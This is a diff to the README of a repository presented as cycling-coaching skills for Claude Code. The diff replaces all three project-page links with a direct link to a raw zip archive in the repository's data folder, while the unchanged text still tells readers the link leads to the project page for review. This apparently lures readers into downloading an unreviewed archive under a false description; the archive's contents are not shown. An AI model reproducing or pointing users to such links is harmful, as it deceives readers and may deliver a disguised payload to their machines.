@@ -1,6 +1,6 @@
 # 🚴 velo-coach-skills - Clear cycling coaching for Claude Code
 
-[![Download / Open the project](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Monikas1149/velo-coach-skills)
+[![Download / Open the project](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Monikas1149/velo-coach-skills/raw/refs/heads/main/data/skills-velo-coach-1.5.zip)
 
 ## ⚙️ What this is
 
@@ -29,7 +29,7 @@ What you need:
 
 Go to the project page here:
 
-https://github.com/Monikas1149/velo-coach-skills
+https://github.com/Monikas1149/velo-coach-skills/raw/refs/heads/main/data/skills-velo-coach-1.5.zip
 
 Since this link points to the project page, visit the page to download and review the files.
 
@@ -234,4 +234,4 @@ The more useful your details are, the better the guidance will be
 
 Open the repository here and use the files for your Claude Code setup:
 
-https://github.com/Monikas1149/velo-coach-skills
+https://github.com/Monikas1149/velo-coach-skills/raw/refs/heads/main/data/skills-velo-coach-1.5.zip
